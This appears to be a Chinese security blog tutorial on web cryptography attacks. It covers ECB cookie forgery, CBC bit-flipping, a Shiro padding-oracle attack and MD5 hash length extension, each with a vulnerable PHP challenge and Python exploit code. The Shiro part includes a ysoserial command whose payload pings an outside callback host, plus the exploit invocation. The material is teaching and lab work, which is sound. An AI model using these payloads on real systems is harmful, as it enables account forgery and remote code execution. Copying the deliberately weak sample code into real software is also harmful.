> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vPwdu8TB5AsXugXDG2jL1Q)

### 0x1基本概念

#### 0x1.1分组密码

      分组密码又称为分块加密或块加密，是一种对称加密算法，这类算法将明文分成多个等长的组，使用确定的算法和对称秘钥对每组分别加密或解密，常见的算法有DES、3DES、AES。

##### 0x1.1.1加密算法

       DES需要加密的明文按64位进行分组，加密密钥是根据用户输入的秘钥生成的，密钥长64位，但密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1，在计算密钥时要忽略这8位），分组后的明文组和56位的密钥按位替代或交换的方法形成密文组的加密方法。

DES算法加密流程 ：  
（1）输入64位明文数据，并进行初始置换IP；  
（2）在初始置换IP后，明文数据再被分为左右两部分，每部分32位，以L0，R0表示；  
（3）在秘钥的控制下，经过16轮运算(f)；  
（4）16轮后，左、右两部分交换，并连接一起，再进行逆置换；  
（5）输出64位密文。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnQwlJMF4Z471zOExAB7XsPwRnXfWtIF3KBWTWpsCg5xPy7ibc5CD0SIibAaOruWDYwZibFzngtQLBHsA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

由于DES密码长度容易被暴力破解，所以3DES算法通过对DES算法进行改进，增加DES的密钥长度来避免类似的攻击，针对每个数据块进行三次DES加密；因此，3DES加密算法并非什么新的加密算法，是DES的一个更安全的变形，它以DES为基本模块，通过组合分组方法设计出分组加密算法。  
该算法的加解密过程分别是对明文数据进行三次DES加密或解密,得到明文

  

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnQwlJMF4Z471zOExAB7XsPwKnZ8jjWlmlINXAnP75UVNbhWpGA2ibzjofGXF09xpXCde6wta1GesoQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

AES（Advanced Encryption Standard），在密码学中又称Rijndael加密法，是美国联邦政府采用的一种分组加密标准。这个标准用来替代原先的DES。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同。

AES加密过程涉及到4种操作：字节替代、行移位、列混淆和轮密钥加。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnQwlJMF4Z471zOExAB7XsPwYlaEApkzhMiapqtklHozbiavL9f9OnEYs5OhI9rQyIBicFdZiaZ6suH46A/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

##### 0x1.1.2分组模式

       在分组加密算法中，有ECB,CBC,CFB,OFB,CTR这几种算法模式。这里就对常见的ECB和CBC模式简单介绍。

ECB 模式全称为电子密码本模式（Electronic codebook），在ECB模式中，将明文分组加密之后的结果将直接成为密文分组。  
ECB加密：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnQwlJMF4Z471zOExAB7XsPwicMtYFr0fKQr28LOw36gWZNU2ianKLxibIGiacssicvAygDq9QYFaeRJjlw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

ECB解密：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnQwlJMF4Z471zOExAB7XsPwibVBdhia6xvk3J9a6Rg3vDDiaYUVCV0ghNdD8vcOPgmiclDeBcpSQfGAibw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

CBC 全称为密码分组链接（Cipher-block chaining） 模式。在CBC模式中，首先将明文分组与前一个密文分组进行XOR运算，然后再进行加密。第一个明文分组需要一个初始化向量(IV)进行XOR运算。  
CBC加密：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnQwlJMF4Z471zOExAB7XsPwargwjDcc7ccAQVJKShziceRRJ5vLdI5TRtibGkCUyBYR2afhRMpepd9A/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

CBC解密：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnQwlJMF4Z471zOExAB7XsPwjD7iaib55fBB6WibfvRyJiar4dhcDbx163ohRGgM2iaZXGQ4zFMPj1u4Pfw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### 0x1.2Hash算法

       Hash是把任意长度的输入通过散列算法变换成固定长度的输出，该输出就是散列值。  
常见的hash算法有MD5、SHA1、SHA256 、SHA512等。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnQwlJMF4Z471zOExAB7XsPwtacNaUP1NbdaatnOXO6hibzEvIHzzYMQ9JqalPC5OiaZsu9GfJlgAoRQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

MD5 算法的输入为长度小于 2^64 bit 的消息比特串，输出为固定 128 bit 的消息散列值，输入数据需要以 512 bit 为单位进行分组。

MD5的实现原理图：  

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnQwlJMF4Z471zOExAB7XsPwicWfTBhhG1NNn36icc2wARGdMxRUsciaXQraXh0P9DTDMhJ8VGA02wnBw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

MD5实现步骤：  
（1）填充bits  
如果输入message(bit)对512求余的结果不等于448，就需要填充使其结果等于448。补位二进制是在message的后面加上一个1，后面跟着 n 个0。在 16 进制下，需要在message后补80，就是 2 进制的10000000。填充完后，len(message)mod512=448(bit)。  
（2）补充长度  
补位之后，用64位来存储填充前信息长度。这64位加在第一步结果的后面。这样len(message)mod512=0。长度是小端存储的，也就是说高字节放在高地址中。  
例如要对 “hello world”进行填充：”hello world”是11个字母，11 byte (88 bit )，换算成16进制位0x58，其后跟着7个字节的0x00，则：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnQwlJMF4Z471zOExAB7XsPwWAMAmMibhACqia4yCBxjGuYuFQlsibNm99pBkHrlMUDvhC1qYT35ESYzw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

（3）初始化向量  
初始链接变量 IV 在最开始存于 4 个 32 bit 的寄存器 A、B、C、D 中，将参与第一个分组单元的哈希运算，它们分别为：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnQwlJMF4Z471zOExAB7XsPwNNKsbzXrDgjv85FX5Xywth3quyFaP6cXKktsRA1qjJ6zAnZIe6WnrQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

（4）复杂的函数运算

### 0x2 攻击方式

#### 0x2.1ECB模式攻击

       ECB将明文分组加密后直接成为密文分组，而密文则是由密文分组直接拼接而成。  
因为每个分组都独自进行加密解密，所以无需破解密文就能操纵部分明文，或者改变明文，在不知道加密算法的情况下得到密文，从而达到攻击效果。

例题：  
cbc.php

```
<?php  
//php7  
function AES($data){  
    $privateKey = "12345678123456781234567812345678";  
    $encrypted=openssl_encrypt($data,'AES-128-ECB',$privateKey,OPENSSL_RAW_DATA);  
    #$encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $privateKey, $data, MCRYPT_MODE_ECB);  
    $encryptedData = (base64_encode($encrypted));  
    return $encryptedData;  
}  
function DE__AES($data){  
    $privateKey = "12345678123456781234567812345678";  
    $encryptedData = base64_decode($data);  
   $decrypted=openssl_decrypt($encryptedData,'AES-128-ECB',$privateKey,OPENSSL_RAW_DATA);  
    $decrypted = rtrim($decrypted, "") ;  
    return $decrypted;  
}  
if (@$_GET['a']=='reg'){  
    setcookie('uid', AES('9'));  
    setcookie('username', AES($_POST['username']));  
    header("Location: http://127.0.0.1/ecb.php");  
    exit();  
}  
if (@!isset($_COOKIE['uid'])||@!isset($_COOKIE['username'])){  
    echo '<form method="post" action="ecb.php?a=reg">  
Username:<br>  
<input type="text"  >  
<br>  
Password:<br>  
<input type="text"  >  
<br><br>  
<input type="submit" value="注册">  
</form> ';  
}  
else{  
    $uid = DE__AES($_COOKIE['uid']);  
    if ( $uid != 4){  
        echo 'uid:' .$uid .'<br/>';  
        echo 'Hi ' . DE__AES($_COOKIE['username']) .'<br/>';  
        echo 'You are not administrotor!!';  
    }  
    else {  
          echo "Hi you are administrotor!!" .'<br/>';  
        echo 'Flag is flag{this is flag}';  
    }  
}  
?>
```

解题思路：  
以administrator权限登陆就就能获得Flag。判断权限则是根据cookie里面的uid参数，cookie包含username和uid两个参数，均为使用ECB加密的密文，然而username的密文是根据注册时的明文生成的

因此我们可以根据username的明文操纵生成我们想要的uid的密文。经过fuzz发现明文分组块为16个字节，那么我们注册17字节的用户，多出的那一个字节就可以是我们我们希望的UID的值，而此时我们查看username的密文增加部分就是UID的密文，即可伪造UID。

注册aaaaaaaaaaaaaaaa1获得1的密文分组,注册aaaaaaaaaaaaaaaa2获得2的密文分组，以此类推  
exp

```
//python2  
import urllib  
import urllib2  
import base64  
import cookielib  
import Cookie  
for num in range(1,50):  
    reg_url='http://127.0.0.1/ecb.php?a=reg'  
    index_url='http://127.0.0.1/ecb.php'  
    cookie=cookielib.CookieJar()  
    opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))  
    opener.addheaders.append(('User-Agent','Mozilla/5.0'))  
    num=str(num)  
    values={'username':'aaaaaaaaaaaaaaaa'+num,'password':'123'}  
    data=urllib.urlencode(values)  
    opener.open(reg_url,data)  
    text=opener.open(index_url,data)  
    for ck in cookie:  
        if ck.name=='username':  
            user_name=ck.value  
    user_name = urllib.unquote(user_name)  
    user_name = base64.b64decode(user_name)  
    hex_name = user_name.encode('hex')  
    hex_name = hex_name[len(hex_name)/2:]  
    hex_name = hex_name.decode('hex')  
    uid = base64.b64encode(hex_name)  
    uid = urllib.quote(uid)  
    for ck in cookie:  
        if ck.name=='uid':  
            ck.value=uid  
    text=opener.open(index_url).read()  
    if 'Flag' in text:  
        print text  
        break  
    else:  
       print num
```

#### 0x2.2CBC模式攻击

##### 0x2.2.1CBC字节翻转攻击

       因为CBC模式是将前一个密文分组和明文分组进行混合加密,所以是可以避免ECB模式的弱点。

但正因为如此，导致解密时修改前一个密文分组就可以操纵后一个的解密后的明文分组，可以将前一个密文中的任意比特进行修改（0,1进行互换，也可以叫翻转）

因此CBC模式有两个攻击点：

*   iv向量，影响第一个明文分组
    
*   第n个密文分组，影响第n+1个明文分组
    

密文通过block cipher encryption解密，得到中间密文，中间密文与IV(或前一个密文区块)异或后得到的是明文，因此可以通过攻击IV，来改变最终的明文。

IV的值该如何修改？可以简单的推理一下。  
解密过程中，因为中间密文 ^ 原始IV = 原始明文 ，所以中间密文=原始IV^原始明文。我们想要的伪造明文=中间密文^伪造IV = 原始IV^原始明文^伪造IV，可以推出伪造IV=原始IV^原始明文^伪造明文。随意我们只要知道原始IV和原始明文这两个值，就可以伪造解密后的结果。

举例：  
密文1[4]的意思是密文1字符串第4个字节，相当于数组下标。  
设：密文1[4] = A，中间密文2[4] = B，明文2[4] = C  
因为A ^ B = C，根据结论有B = A ^ C  
当人为修改A=A ^ C时，那么A ^ B = A ^ C ^ B = B ^ B = 0，这样明文2[4]的结果就为0了  
当人为修改A=A ^ C ^ x (x为任意数值)时，那么  
A ^ B = A ^ C ^ x ^ B = B ^ B ^ x = x，这是明文2[4] = x，这样就达到了控制明文某个字节的目的了。

例题：  
cbc.php

```
<?php  
error_reporting(0);  
include("flag.php");  
  
$iv = 'NGY0MWVlOGE2MGU4NTkxMQ==';  
function decode($str,$key,$iv)  
{  
    return openssl_decrypt(base64_decode($str),"AES-128-CBC",$key,OPENSSL_RAW_DATA,base64_decode($iv));  
}  
  
function encode($str,$key,$iv)  
{  
    return base64_encode(openssl_encrypt($str,"AES-128-CBC",$key,OPENSSL_RAW_DATA, base64_decode($iv)));  
}  
  
  
if(isset($_COOKIE['username']) && isset($_COOKIE['iv'])){  
    if(decode($_COOKIE['username'],$key,$_COOKIE['iv']) === "admin"){  
        echo "hello admin<br>";  
        echo $flag."<br>";  
    }  
    else if(decode($_COOKIE['username'],$key,$_COOKIE['iv']) === "guest"){  
        echo "hello guest<br>";  
    }  
    else {  
        echo "iv or username error";  
    }  
}  
else{  
    $enc = encode("guest",$key,$iv);  
    setcookie('username',$enc);  
    setcookie('iv',$iv);  
}  
highlight_file(__file__);  
?>
```

flag.php

```
<?php  
$key = "8bd54bcfe6a23fc0";  
$flag = "flag{this_is_flag}";  
?>
```

解题思路:

可以得到IV值和原始明文 “guest”,从源码中知，只要伪造明文 “admin”,即可得到flag，计算伪造IV值

```
import base64  
iv = base64.b64decode('NGY0MWVlOGE2MGU4NTkxMQ==')  
admin = 'admin' + '\x0b'*11  
guest = 'guest' + '\x0b'*11  
new_iv = ''  
for i in range(len(admin)):  
    new_iv += chr(ord(iv[i]) ^ ord(admin[i]) ^ ord(guest[i]))  
print base64.b64encode(new_iv)  
# Mnc8K39lOGE2MGU4NTkxMQ==
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

##### 0x2.2.2CBC Padding Oracle 攻击

       分组密码Block Cipher需要在加载前确保每个每组的长度都是分组长度的整数倍。一般情况下，明文的最后一个分组很有可能会出现长度不足分组的长度:

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这个时候，普遍的做法是PKCS#5标准中定义的规则，在最后一个分组后填充一个固定的值，这个值的大小为填充的字节总数。即假如最后还差3个字符，则填充3个0×03

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

因为填充发生在最后一个分组，所以我们主要关注最后一个分组

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在Padding Oracle Attack攻击中，攻击者输入的参数是IV和Cipher，要通过对IV的”穷举”来请求服务器端对指定的Cipher进行解密，并对返回的结果进行判断,猜解出正确的中间密文，得到中间密文后，就可以伪造IV来伪造明文。  
比如在web应用中，如果Padding不正确，则应用程序很可能会返回500的错误(程序执行错误)；如果Padding正确，但解密出来的内容不正确，则可能会返回200的自定义错误(这只是业务上的规定)，所以，这种区别就可以成为一个二值逻辑的”注入点”。  
详情可看此文章：https://www.freebuf.com/articles/web/15504.html

利用条件：

1.  攻击者知道密文和初始向量IV
    
2.  padding错误和padding正确服务器可返回不一样的状态
    

以Shiro padding oracle 为例：

Shiro的 RememberMe 使用 AES-128-CBC 模式加密，容易受到 Padding Oracle 攻击，AES 的初始化向量 IV 就是cookie的 rememberMe base64 解码后的前16个字。

Shrio要有Oracle Padding漏洞，有填充提示

*   接受正确的密文（填充正确包含合法值），应用程序返回HTTP 200
    
*   接受非法的密文（解密后填充不正确），应用程序返回HTTP 500，返回框架错误页面
    
*   接受合法的密文（填充正确，值不合法），应用程序显示自定义错误HTTP 200，但是有返回自定义错误页面
    

实际上不是原本的请求，都不满足第一条，所以只要填充正确和填充不正确返回不同就可以了。

漏洞环境搭建

```
git clone https://github.com/3ndz/Shiro-721.git  
cd Shiro-721/Docker  
docker build -t shiro-721 .  
docker run -p 8080:8080 -d shiro-721
```

1.登录 Shiro 测试账户获取合法 Cookie（勾选Remember Me）

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

2.生成java payload

```
java -jar ysoserial.jar CommonsBeanutils1 "ping awa4xw.ceye.io" > payload.class
```

3.执行exp，经过了几十分钟的爆破，得到padding oracle attack后的cookie

```
python2 shiro_exp.py http://192.168.247.130:8080/ NqoZZVVnFvBxH0m7tavNPhx2H2mPLucccvcuM3WSSIQIWyksw3xnNG70MWsSy+TFCUZEkiQSdV38fTmfJgsuEJPFLUrVQUwDkZ+disZ5k1auCE2swMsLE7cUxDykdPk79k6Q0k6N8rZpszd/1+F6uoA8PDH9zaYt7RwXUS2z+JKFV30Cl7h0zZvlKYK98DrITFX8sW0Z/veIgh6G3ljIAIo6CgRUKMwYsi1dfD+HeE5qxTpofOfyuUnkguzY//gvEahmxWy85qMBgSchENUn+aKOFWnrtEvTQ3bOhN3T5Lb2zz0waCSpFEyC+tBDYxUWiiANjJnkUf/KtOZ/tQheAjZezmBymL5qOQJPMaVuGyQtX7AGIhn3r3wrLdQsCog4NzCM5EcaNV4zuGEXL4Mfnk0xh7Lv4O04c931gCRM6zv5hB743NwjdO72hc1TcC/CYLRjfs5rUWHerNClnBJhw5h+pQuJdZ0qsv95aC0Qeh4ywpQKELPfpbuZNEd1zt75 payload.class
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

4.复制该cookie，然后重放一下数据库，即可成功执行命令  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

#### 0x2.3Hash长度扩展攻击

       Hash长度扩展攻击可以在知道HASH(message(salt+data))的hash值的情况下，算出HASH(message+padding+a)的hash值，就是根据短的消息的hash算出更长的消息的hash。  
利用条件：

1.  知道salt的长度
    
2.  要知道一个由salt加密后的hash值
    
3.  知道data的值(未加盐的明文)
    

例题：

hash.php

```
<?php  
include "secret.php";  
@$username=(string)$_POST['username'];  
function enc($text){  
    global $key;  
    return md5($key.$text);  
}  
if(enc($username) === $_COOKIE['verify']){  
    if(is_numeric(strpos($username, "admin"))){  
        die($flag);  
    }  
    else{  
        die("you are not admin");  
    }  
}  
else{  
    setcookie("verify", enc("guest"), time()+60*60*24*7);  
    setcookie("len", strlen($key), time()+60*60*24*7);  
}  
show_source(__FILE__);
```

secret.php

```
<?php  
$key='123456789qwertyuiopasdfghjklzxcvbnm12345671475';  
$flag='flag{this_1s_a_f1ag}';  
?>
```

解题思路：  
可以得到enc(“guest”)的值 ,$key的长度为46,要求我们输入的username在经过enc函数加密之后，与`$_COOKIE[‘verify’]`的值相等，并且username中必须含有admin。

使用hashdump工具

```
git clone https://github.com/bwall/HashPump  
apt-get install g++ libssl-dev  
cd HashPump  
make  
make install
```

用法

```
Input Signature: 已知的hash值，这里是$_COOKIE['verify']的值  
Input Data: 上面的hash值解密后的字符串，这里是guest。  
Input Key Length: $key的长度  

Input Data to Add: 想要添加的数据，由于题目要求要含有admin，所以这里是admin。


```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后我们将得到的hash值去替换数据包中`$_COOKIE[‘verify’]`的值，然后post提交  
username=guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin即可。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 0x3总结

      这里简单介绍了常见的WEB密码学攻击方式，如有错误的地方欢迎指正。

参考链接：  
https://ciphersaw.me/2017/11/12/Hash%20Length%20Extension%20Attack%EF%BC%88%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%EF%BC%89/  
https://www.anquanke.com/post/id/84724  
https://www.freebuf.com/articles/web/15504.html